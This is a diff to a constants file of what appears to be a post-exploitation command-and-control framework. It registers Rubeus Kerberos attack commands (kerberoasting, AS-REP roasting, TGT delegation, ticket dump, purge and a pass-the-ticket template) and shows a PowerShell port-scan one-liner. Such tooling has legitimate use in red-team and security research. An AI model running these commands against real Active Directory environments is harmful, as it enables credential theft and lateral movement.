@@ -98,8 +98,16 @@ class myconstant():
         self.CMD_STAGER_TOOLS_PSJUMP = "psjump"
         self.CMD_STAGER_TOOLS_PSJUMP_EXE = "psjump-exe"
 
-        self.CMD_STAGER_TOOLS_KERBER = "kerberoast"
-        self.CMD_STAGER_TOOLS_ASREP = "asreproast"
+        self.CMD_STAGER_TOOLS_RUBEUS_KERBER = "kerberoast"
+        self.CMD_STAGER_TOOLS_RUBEUS_ASREP = "asreproast"
+        self.CMD_STAGER_TOOLS_RUBEUS_ASKTGT = "rubeus-asktgt"
+        self.CMD_STAGER_TOOLS_RUBEUS_DELEG = "rubeus-tgtdeleg"
+        self.CMD_STAGER_TOOLS_RUBEUS_TRIAGE = "rubeus-triage"
+        self.CMD_STAGER_TOOLS_RUBEUS_PURGE = "rubeus-purge"
+        self.CMD_STAGER_TOOLS_RUBEUS_IMPORT = "rubeus-import"
+        self.CMD_STAGER_TOOLS_RUBEUS_DUMP = "rubeus-dump"
+        self.CMD_STAGER_TOOLS_RUBEUS_SAVE = "rubeus-save"
+
 
         self.CMD_STAGER_TOOLS_MSF = "msf"
 
@@ -111,7 +119,10 @@ class myconstant():
                                             self.CMD_STAGER_TOOLS_GETDOMAIN, self.CMD_STAGER_TOOLS_WHOAMI, self.CMD_STAGER_TOOLS_HOSTNAME, self.CMD_STAGER_TOOLS_CD, 
                                             self.CMD_STAGER_TOOLS_LS, self.CMD_STAGER_TOOLS_DOWNLOAD, self.CMD_STAGER_TOOLS_SHARPHOUND3, self.CMD_STAGER_TOOLS_SPAWN_PS, 
                                             self.CMD_STAGER_TOOLS_PSRESET, self.CMD_STAGER_TOOLS_PSEXEC, self.CMD_STAGER_TOOLS_PSREMOTE, self.CMD_STAGER_TOOLS_PSJUMP, 
-                                            self.CMD_STAGER_TOOLS_PSJUMP_EXE,self.CMD_STAGER_TOOLS_KERBER,self.CMD_STAGER_TOOLS_ASREP,self.CMD_STAGER_TOOLS_MSF,self.CMD_STAGER_TOOLS_PORTSCAN]
+                                            self.CMD_STAGER_TOOLS_PSJUMP_EXE,self.CMD_STAGER_TOOLS_RUBEUS_KERBER,self.CMD_STAGER_TOOLS_RUBEUS_ASREP,self.CMD_STAGER_TOOLS_RUBEUS_ASKTGT,
+                                            self.CMD_STAGER_TOOLS_RUBEUS_DELEG,self.CMD_STAGER_TOOLS_RUBEUS_TRIAGE,self.CMD_STAGER_TOOLS_RUBEUS_PURGE,self.CMD_STAGER_TOOLS_RUBEUS_IMPORT,
+                                            self.CMD_STAGER_TOOLS_RUBEUS_DUMP,self.CMD_STAGER_TOOLS_RUBEUS_SAVE,
+                                            self.CMD_STAGER_TOOLS_MSF,self.CMD_STAGER_TOOLS_PORTSCAN]
 
         self.CMD_PIPE_LISTENER_GETINFO = "info"
         self.CMD_PIPE_LISTENER_SETPIPENAME = "setpipename"
@@ -235,6 +246,11 @@ class mybuildin_cmd():
         self.KERBER = "Invoke-Rubeus kerberoast"
         self.ARSREP_HC = "Invoke-Rubeus \"asreproast /format:hashcat\""
         self.ARSREP = "Invoke-Rubeus asreproast"
+        self.TRIAGE = "Invoke-Rubeus triage"
+        self.DELEG = "Invoke-Rubeus tgtdeleg"
+        self.PURGE = "Invoke-Rubeus purge"
+        self.PTT = "Invoke-Rubeus \"ptt /ticket:{}\""
+
 
         self.PORTSCAN = "80,8080,445,139,135,3389,1433,5985,47001 | % {{if ((new-object Net.Sockets.TcpClient).ConnectAsync(\"{}\",$_).Wait({})){{\"Port $_ is open!\"}}else{{\"Port $_ is Closed\"}}}} 2>$null"
 
